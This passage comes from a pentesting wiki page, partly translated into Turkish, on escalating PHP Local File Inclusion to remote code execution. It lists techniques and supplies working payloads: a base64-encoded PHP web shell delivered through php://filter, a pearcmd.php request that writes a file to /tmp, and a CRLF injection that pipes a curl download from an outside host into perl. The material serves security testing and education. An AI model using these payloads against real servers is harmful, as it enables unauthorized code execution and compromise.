As shown in [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) article, PHP base64 filter non-base64 karakterleri yok sayar. Bunu dosya uzantısı kontrolünü bypass etmek için kullanabilirsiniz: eğer sonu ".php" ile biten base64 sağlarsanız, filtre "." karakterini yok sayar ve base64'e "php" ekler. İşte bir örnek payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Via php filters (dosya gerekmez)

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) explains that you can use **php filters ile rastgele içerik üretmek** as output. Which basically means that you can **herhangi PHP kodu üretmek** for the include **bir dosyaya yazmanıza gerek kalmadan**.

{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Via segmentation fault

**/tmp** içinde **geçici** olarak saklanacak bir dosya yükleyin, sonra **aynı istek** içinde bir segmentation fault tetikleyin; bu durumda **geçici** dosya silinmeyecek ve onu arayabilirsiniz.

{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Via Nginx temp file storage

Eğer bir **Local File Inclusion** bulduysanız ve Nginx PHP'nin önünde çalışıyorsa, aşağıdaki teknikle RCE elde edebilirsiniz:

{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Via PHP_SESSION_UPLOAD_PROGRESS

Eğer bir **Local File Inclusion** bulduysanız, hatta bir session'ınız yoksa ve `session.auto_start` `Off` ise bile. Multipart POST verisinde `PHP_SESSION_UPLOAD_PROGRESS` sağlarsanız, PHP oturumu sizin için etkinleştirecektir. Bunu RCE elde etmek için kötüye kullanabilirsiniz:

{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Via temp file uploads in Windows

Eğer bir **Local File Inclusion** bulduysanız ve sunucu **Windows** üzerinde çalışıyorsa, RCE elde etme şansınız olabilir:

{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Via `pearcmd.php` + URL args

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), the script `/usr/local/lib/phppearcmd.php` exists by default in php docker images. Moreover, it's possible to pass arguments to the script via the URL because it's indicated that if a URL param doesn't have an `=`, it should be used as an argument. See also [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) and [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

The following request create a file in `/tmp/hello.php` with the content `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Aşağıdaki, RCE elde etmek için bir CRLF vuln'ünü kötüye kullanır (kaynak: [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### phpinfo() ile (file_uploads = on)

Eğer bir **Local File Inclusion** bulduysanız ve **phpinfo()**'yu açığa çıkaran bir dosyada file_uploads = on ise RCE elde edebilirsiniz:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure ile

Eğer bir **Local File Inclusion** bulduysanız ve geçici dosyanın yolunu **can exfiltrate the path** edebiliyorsanız AMA **server** dahil edilecek dosyanın PHP işaretlerine sahip olup olmadığını **kontrol ediyorsa**, you can try to **bypass that check** with this **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### eternal waiting + bruteforce ile

Eğer LFI'yi **upload temporary files** için kötüye kullanıp sunucunun PHP yürütmesini **hang** edecek şekilde yapabiliyorsanız, geçici dosyayı bulmak için saatlerce **brute force filenames during hours** ile deneme yapabilirsiniz:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Fatal Error'a

Eğer `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar` dosyalarından herhangi birini include ederseniz. (Bu hatayı tetiklemek için aynı dosyayı 2 kez dahil etmeniz gerekir).

**Bunun nasıl kullanışlı olduğunu bilmiyorum ama işe yarayabilir.**\
_PHP Fatal Error'a neden olsanız bile, yüklenen PHP geçici dosyaları silinir._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


## Kaynaklar

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
